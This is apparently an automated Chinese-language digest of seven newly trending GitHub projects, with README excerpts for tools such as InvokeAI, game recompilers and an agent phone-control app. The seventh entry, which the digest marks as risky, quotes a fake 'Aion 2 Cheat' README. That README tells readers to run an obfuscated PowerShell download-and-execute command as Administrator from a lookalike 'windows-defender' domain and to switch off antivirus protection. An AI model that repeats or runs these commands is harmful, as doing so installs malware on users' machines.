📊 开源日报 — 2026-11-09
共发现 7 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  invoke-ai/InvokeAI
    ⭐ 29036 stars  |  🍴 3101 forks  |  💻 TypeScript  |  📅 2022-08-17
    🔗 https://github.com/invoke-ai/InvokeAI
    📡 来源: 🤖 AI / LLM / RAG | 活跃 | AI image generation
    🏷️ ai-art, artificial-intelligence, generative-art, image-generation, img2img, inpainting, latent-diffusion, linux, macos, outpainting
    📝 Invoke is a leading creative engine that uses image and video generation models to empower professionals, artists, and enthusiasts to generate and create visual media using the latest AI-driven technologies. The solution offers an industry-leading application interface, and serves as the foundation for multiple commercial products.

    README 摘要:
    # Invoke - Professional Creative AI Tools for Visual Media
    
    [![discord badge]][discord link] [![latest release badge]][latest release link] [![github stars badge]][github stars link] [![github forks badge]][github forks link] [![latest commit to main badge]][latest commit to main link] [![github open issues badge]][github open issues link] [![github open prs badge]][github open prs link] [![translation status badge]][translation status link]
    
    [][sponsor link]
    
    Invoke is a leading creative engine built to empower professionals and enthusiasts alike. Generate and create stunning visual media using the latest AI-driven technologies. Invoke offers an industry leading web-based UI, and serves as the foundation for multiple commercial products.
    
    - Free to use under a commercially-friendly license
    - Download and install on compatible hardware
    - Generate, refine, iterate on images, and build workflows
    
    # Documentation
    
    | **Quick Links**                                                                                                                                             |
    | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
    | [Installation and Updates][installation docs] - [Documentation and Tutorials][docs home] - [Bug Reports][github issues] - [Contributing][contributing docs] |
    
    # Installation
    
    To get started with Invoke, Download the Launcher.
    
    ## Troubleshooting, FAQ and Support
    
    Please review our [FAQ][faq] for solutions to common installation problems and other issues.
    
    For more help, please join our [Discord][discord link].
    
    ## Features
    
    Full details on features can be found in [our documentation][features docs].
    
    ### Web Server & UI
    
    Invoke runs a locally hosted web server & React UI with an industry-leading user experience.
    
    ### Unified Canvas
    
    The Unified Canvas is a fully integrated canvas implementation with support for all core generation capabilities, in/out-painting, brush tools, and more. This creative tool unlocks the capability for artists to create with AI as a creative collaborator, and can be used to augment AI-generated imagery, sketches, photography, renders, and more.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  Eglantine-Community/Eglantine
    ⭐ 5489 stars  |  🍴 597 forks  |  💻 C++  |  📅 2026-10-29
    🔗 https://github.com/Eglantine-Community/Eglantine
    📡 来源: 🚀 两周800+星
    📝 VERY experimental Nintendo Switch 2 emulator

    README 摘要:
    Eglantine
      
    
    Eglantine is a free and opensource (FOSS) Switch 2 emulator, derived from Eden, Yuzu and Sudachi - started by developer Camille LaVey.
    It's written in C++ with portability in mind, with builds for Windows, Linux and macOS
    
        
        
            
        
      
    
      Compatibility |
      Development |
      Building |
      Download |
      Support |
      License
    
    ## Compatibility
    
    The emulator is capable of running Mario Kart World at decent/full speed depending on specs and configurations, and Splatoon Raiders at variable performances
    
    A list of supported games will be available in future. Please be patient.
    
    ## Development
    
    For development discussions, please join us on Discord
    
    If you would like to contribute, we are open to new developers and pull requests. Please ensure that your work is of a high standard and properly documented. You can also contact any of the developers on Discord or Stoat to learn more about the current state of the emulator.
    
    ## Documentation
    
    We have a user manual! See our User Handbook.
    
    ## Building
    
    See the General Build Guide
    
    For information on provided development tooling, see the Tools directory

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  JuneYaooo/rea-video
    ⭐ 4872 stars  |  🍴 693 forks  |  💻 Python  |  📅 2026-10-29
    🔗 https://github.com/JuneYaooo/rea-video
    📡 来源: 🚀 两周800+星
    🏷️ agent-skills, ai-video, aigc-detection, claude-code, codex, ffmpeg, prompt-engineering, remotion, reverse-engineering, short-video
    📝 Reverse-engineer any video, shot by shot: filmed, AI-generated or coded, and how to remake it. 逆向一切视频，逐个镜头看是拍的、AI 生成的还是代码做的，再告诉你怎么复刻。

    README 摘要:
    Reverse-engineer any video.
    
    Shot by shot: was it filmed, AI-generated or coded, and how to remake it.
    
    Website | 中文 | English | Русский | 日本語 | 한국어 | Español | Português | Français | Deutsch
    
      
    
    ⭐ *Help more people find rea-video. Star this repo!*
    
    Left: a TikTok ad shot on a phone. Right: an AI remake with another product. rea-video's verdict: the left is all live footage, one set and two camera positions; the right is all AI, 8 shots across 3 generations.
    
    ## Quick start
    
    rea-video is built for AI agents. In Claude Code, Codex or any agent that can run commands, say:
    
    ```text
    Install https://github.com/JuneYaooo/rea-video, then break down this video: /path/to/video.mp4
    ```
    
    The agent installs the CLI, learns the workflow and runs the whole thing. You need ffmpeg and Python 3.10+.
    
    Install by hand
    
    ```bash
    brew install ffmpeg            # or: sudo apt install ffmpeg
    git clone https://github.com/JuneYaooo/rea-video && cd rea-video
    bash scripts/install_skill.sh  # installs the CLI (pip, or pipx / a local .venv if pip is blocked) and links the skill into ~/.claude, ~/.codex, ~/.agents
    rea-video --help
    ```
    
    You get:
    
    - a one-line summary, e.g. "41% AI video + 59% code UI, 8 s of real screen recording, library music at 122 BPM"
    - a remake plan, split into what to film, what to generate and what to code
    - a full `report.html` with per-shot frames, evidence, prompts, camera and lighting notes, and the audio breakdown
    
    You can also hook up a video-capable model (Gemini or Doubao both work) by giving the agent its endpoint and key. That makes the live/AI/3D calls more accurate and adds a reverse-engineered prompt for every shot. It works fine without one; if your agent can see images, it checks the uncertain shots itself.
    
    > Reports are written in whichever language you ask in (Chinese or English). The example reports below are in English.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  tangerineturtle1/NX2navi
    ⭐ 1596 stars  |  🍴 82 forks  |  💻 C  |  📅 2026-11-07
    🔗 https://github.com/tangerineturtle1/NX2navi
    📡 来源: 🚀 5天300+星
    📝 无描述

    README 摘要:
    # NX2navi
    
    **Join the official NX2navi update discord server: https://discord.com/invite/uf6gSrsPpq** 
    
    **NX2navi** is a static recompilation of *The Legend of Zelda: Ocarina of Time* for Nintendo Switch 2 (game
    version 1.1.1) into a native x86-64 application for Windows, with a Vulkan renderer
    (docs/architecture.md).
    
    > [!IMPORTANT]
    > **No game files are included.** You need your own legally obtained copy of the game, dumped from your own console.
    > Instructions for obtaining those files will not be provided.
    >
    > The game is built from your files on your machine, so the result contains the game. It is for your own use. Do not share it.
    
    ## Status
    
    Early development, playable. Kokiri Forest, Kakariko Village, Death Mountain Trail and its crater, the Temple of
    Time and the Great Fairy fountains play at 60 fps and above on current GPUs, from the title screen and from saves.
    Visual bugs and occasional crashes are still expected (Known issues).
    
    Report problems as issues, following CONTRIBUTING.md.
    
    ## Features
    
    - Native code, not emulation
    - 60 fps by default, or a limit of 30 to 240 fps, the display's refresh rate or unlimited
    - Native widescreen and ultrawide (the window's shape, 21:9 or 32:9) with the HUD, menus and movies kept 16:9
    - Resolutions above the game's 1440p: 1800p, 4K, 5K or the window's own size, sharp on high-DPI displays
    - Upscaling and anti-aliasing: NVIDIA DLSS (DLAA, Quality, Balanced, Performance, Ultra Performance; RTX GPUs) or
      AMD FSR 3.1 (Native AA and the same modes; any GPU), which render the 3D scene at the mode's share and keep the HUD
      sharp; or AMD FSR 1 or bilinear scaling to the window, with a sharpness setting; black bars or stretch
    - Frame generation with AMD FSR 3.1 (any GPU): a generated frame between every two the game draws, with the HUD kept
      out of it, for about twice the frame rate on a fast display; in a window of another shape than the picture, frames
      are generated inside the picture only, so the black bars stay clean
    - HDR on HDR displays: the game's own native HDR, or an enhanced HDR made from its SDR picture
    - Every shader prepared when the game is built, and the pipelines met in play built again in the background at each
      start, so play does not stop to compile them; a draw that must wait for its pipeline has it built on worker
      threads, never on the game's drawing thread
    - In-game settings menu (F1, or Minus and Plus together on a gamepad) and performance overlay (F10)
    - Keyboard, mouse and gamepads w

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  DIYgod/pinky
    ⭐ 1119 stars  |  🍴 114 forks  |  💻 Go  |  📅 2026-11-06
    🔗 https://github.com/DIYgod/pinky
    📡 来源: 🚀 5天300+星
    📝 Let AI agents use your phone, with you in the loop.

    README 摘要:
    Pinky
    Let any AI agent use your iPhone or Android phone, from macOS, Windows or Linux, with you in the loop.
    Download · Get started · FAQ · Discord
    English · 简体中文 · 日本語
    A real Claude Code run on an Android 16 emulator. Pinky asks before payments by default; this run also asks before messages.
    
    Pinky lets any agent (Claude Code, Claude Desktop, Codex, Cursor or a script) operate a real iPhone or Android phone over MCP, while you watch on your computer, approve risky steps, take over and review what happened. Approvals are enforced by Pinky's gateway, not by instructions to the agent.
    
    - **Every platform.** One app for macOS (Apple silicon and Intel), Windows and Linux. It drives Android phones (Android 10 to 17) and iPhones on iOS 17.4 or later: nothing to install on iOS 27 and later, and a helper installed once from Xcode on iOS 17.4 to 26, which you can also choose on iOS 27 (tried there and on Simulators, not yet on a phone below 27; details).
    - **Tiny and native.** The window is drawn by MyGo on the GPU, with no Electron and no webview: a 16–22 MB download that idles at about 70 MB of memory and 0% CPU on a Mac.
    - **Any agent, one click.** Settings › Agents connects Claude Code, Claude Desktop, Codex, Cursor and more, and any agent that can use MCP servers works, on the same computer or over HTTP.
    - **Locked phone? Unlock it from your computer.** Save the phone's PIN in Pinky once, then confirm each unlock with Touch ID, Windows Hello or your keyring's password. Agents never see the PIN.
    - **Free and open source** under the Apache-2.0 license, with no account to create.
    
    You approve the risky steps. Payments, trades and transfers wait for your click; in Settings › Safety you can have sends, orders, deletions, calls, installs, links that leave the app and settings changes wait too, or every step. Pinky spots these buttons in 10 languages. The rules run in Pinky's gateway, so an agent can't approve itself, even when text on the screen tries to talk it into it.
    Off-limits by default. Banking, wallet and password-manager apps are invisible to agents, and agents can't type into password or one-time-code fields. When an agent needs a banking or wallet app for a task, it asks, and you can allow that app for that task only. Every new agent needs your approval and gets only the scope you give it.
    
    Your phone stays yours. On Android 13 and later, agents work on a hidden second screen, so the phone's own screen stays yours, or off and locked. On older Android pho

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  jhaizhou-ops/S2Arm
    ⭐ 1002 stars  |  🍴 229 forks  |  💻 C#  |  📅 2026-11-08
    🔗 https://github.com/jhaizhou-ops/S2Arm
    📡 来源: 🚀 5天300+星
    🏷️ apple-silicon, arm64, game-porting, ios, ipados, macos, metal, s2arm, static-recompilation, switch
    📝 Run your own Switch games natively on iPhone, iPad and Mac: game code rewritten to ARM64, graphics direct to Metal, one app for the whole library. Bring your own games and keys. 把你自己的 Switch 游戏原生带到 iPhone / iPad / Mac。

    README 摘要:
    **Your own Switch games, running natively on iPhone, iPad and Mac.** Game code is rewritten to native ARM64 and runs directly on the device's processor, with graphics going straight to Metal. Your whole library lives in one app, and a few clicks in the Mac or Windows launcher take a game from import to play.
    
    Platforms: iPhone / iPad (iOS / iPadOS 18 and later) · Mac (Apple silicon, macOS 15 and later) · Build on Mac or Windows · Android / HarmonyOS coming soon · License: Apache-2.0 · **Bring your own games**
    
    简体中文 · Download the launcher · All releases · Evidence
    
    ## A native port, not an emulator
    
    The game's own ARM64 code is rewritten at build time and then runs directly on the processor in your iPhone, iPad or Mac. There is no CPU emulator in between. Graphics calls are translated straight to Metal, and system services come from a native host. That is where the speed, the low heat and the battery life come from. Evidence
    
    ## One app, your whole library
    
    Every game you import goes into the same S2Arm app; open it and pick what to play. The whole library takes a single App slot on your developer account, so adding a game never means installing another app or spending another signing slot. Evidence
    
    ## Graphical launchers, next to zero setup
    
    There is a graphical launcher for Mac and one for Windows. On first launch the welcome page boils everything down to three steps: get this computer ready, add your keys, add your games, with a single primary button at any moment. Everything else is either bundled or fetched in one click, and you never touch a command line.
    
    After you click Build, every stage shows its progress, elapsed and remaining time, and disk use. Several games can queue up and build one after another. Evidence
    
      
      
    
      
      
    
    ## Let an AI drive
    
    Both the Mac and Windows launchers expose a control interface, `s2armctl`. An AI assistant can import games, build, install, follow progress and read errors, and every step shows up in the launcher window. A companion self-check, self-fix and feedback toolkit lets the AI find a problem, apply the documented fix, and, when it cannot, package a diagnostic bundle for you to file. Watch an AI diagnose and fix a real problem end to end: Evidence
    
    ### Have an AI do it for you
    
    Send this to your AI assistant (it needs to be able to run commands on your computer):
    
    > Please read https://github.com/jhaizhou-ops/S2Arm/blob/main/launchers/macos/skill/s2arm-operator/SKILL.md and then help me install my Switch game

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  ⚠️风险  Outsideclofilter/aion-2-trainer-tool
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 400 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-08
    🔗 https://github.com/Outsideclofilter/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
    📝 Aion 2, an AI-driven LLM prompt engineering resource, offers a pre-configured environment for seamless local workstation deployment in 2026.

    README 摘要:
    # AION 2 Cheat
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Aion 2 Cheat.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.9 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.
